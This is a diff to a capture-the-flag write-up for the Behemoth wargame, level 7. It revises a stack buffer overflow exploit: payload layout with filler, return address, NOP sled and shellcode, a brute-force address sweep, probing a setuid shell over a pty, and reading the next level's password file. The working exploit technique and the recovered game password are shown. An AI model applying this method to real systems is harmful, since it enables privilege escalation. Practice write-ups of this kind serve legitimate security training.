@@ -347,10 +347,10 @@ passwords) are the recorded ones.
    ```
 6. **Write `/tmp/e_behemoth7.py` in vim.** It reads `/tmp/b7.bin`, builds
    ```
-   b"A"*512 + b"A"*12 + b"BBBB" + struct.pack("<I", addr) + sc
+   b"A"*524 + b"BBBB" + struct.pack("<I", addr) + b"\x90"*2000 + sc
    ```
-   (512 letters for the filter, 12 more letters up to the saved EBP, 4 filler bytes, the return address, then the shellcode), skips addresses whose encoding contains a NUL byte, sweeps `0xffffd000..0xffffe400` looking for `PWN!` in the output of a run that did not die from a signal, and finally runs the winning address with `communicate(b"id\ncat /etc/behemoth_pass/behemoth8\nexit\n")`.
-7. **Run it.** The recording shows `landed in the shellcode at 0xffffdbb0`, `PWN!`, `uid=13008(behemoth8)`, and `L3WIFhR0LW`.
+   (524 letters so the filter window `i <= 0x1ff` is filled and the saved EBP slot gets letters, 4 filler bytes, the return address, then a 2000-byte NOP sled so any return lands in the shellcode without an exact stack address), skips addresses whose encoding contains a NUL byte, and probes candidates on a **raw pty**: after a 2-second settle (the spawned `sh` swallows input sent too early) it writes `id\n\n\n` and checks for `uid=13008` in the reply. Probes must not kill or wait on the child — the setuid shell ignores our signals (EPERM) and `waitpid` blocks forever; the child is left orphaned and dies when the pty closes. The sweep walks `0xffffdfa0..0xffffe300` in steps of 8.
+7. **Run it.** The recording shows `landed in the shellcode at 0xffffdfa8`, `uid=13008(behemoth8) gid=13007(behemoth7)`, and `L3WIFhR0LW`.
 8. **Verify.** Log in as behemoth8; `CONGRATULATIONS` confirms the game is complete.
 - **Password for behemoth8:** `L3WIFhR0LW`
 - **Verification:** logged in as `behemoth8`; `cat CONGRATULATIONS` → "Congratz!! Now fight for your right to eip=0x41414141!!"
